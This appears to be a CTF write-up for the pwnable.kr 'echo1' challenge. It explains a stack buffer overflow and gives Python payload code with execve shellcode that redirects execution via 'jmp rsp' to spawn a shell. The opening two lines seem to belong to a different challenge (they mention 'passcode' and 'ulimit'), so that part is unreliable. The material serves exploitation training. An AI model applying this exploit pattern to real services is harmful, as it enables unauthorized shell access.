# pwnable.kr -- Rookiss -- echo1
Actually, the program do not check whether it does read `passcode`.

So just use `ulimit -f 0` to forbid program write any bytes and `passcode` will must be `0`.

## 1. Challenge
  > Pwn this echo service.  
  >   
  > download : http://pwnable.kr/bin/echo1  
  >   
  > Running at : nc pwnable.kr 9010  

## 2. Solution
  * Download the binary file `echo1` and open it in IDA.

  * In function `echo1`:

    ```cpp
    void __cdecl echo1()
    {
      char buffer[32]; // [rsp+0h] [rbp-20h]

      o->greetings(o->str);
      get_input(buffer, 128);
      puts(buffer);
      o->byebye(o->str);
    }
    ```

    we can see `get_input(buffer, 128);` makes a buffer overflow where the length of `buffer` is 32 bytes and `get_input(buffer, 128);` allows us write 128 bytes at most.

    And after we use `checksec`, we can know that there is no `PIE`, no `NX`, and no `Canary`. So just overflow it and control `RIP`.

  * But where do we set `RIP` to?

    In function `main`, there is a `id = *(_DWORD *)buffer` where `id` is a global variable.

    So we can set `RIP` to the address of `id` which contains the machine code of `amd64` assembly code `jmp rsp`.

    When function `echo1` returns, which means the program runs to `ret`, CPU will pop the address of `id` to register `RIP` then execute `jmp rsp`.

    After that, the program will execute the shellcode after where the address of `id` stores on stack.

  * So, when you input your name, it must start with the machine code of `jmp rsp`.

    And payload can be:

    ```python
    addr_id = 0x00000000006020A0
    payload = b'fuckfuck' * 4 + b'/bin/sh\x00' + pack(addr_id, 64) + shellcode
    ```

    where shellcode is:

    ```python
    sys_execve = 59
    shellcode = asm('xor rsi, rsi') + \
                asm('xor rdx, rdx') + \
                asm('sub rsp, 0x10') + \
                asm('mov rdi, rsp') + \
                asm('mov rax, ' + hex(sys_execve)) + \
                asm('syscall')
    ```

    Send your name which starts with the machine code of `jmp rsp` and choose `1. BOF echo`, then send payload and you will get shell.
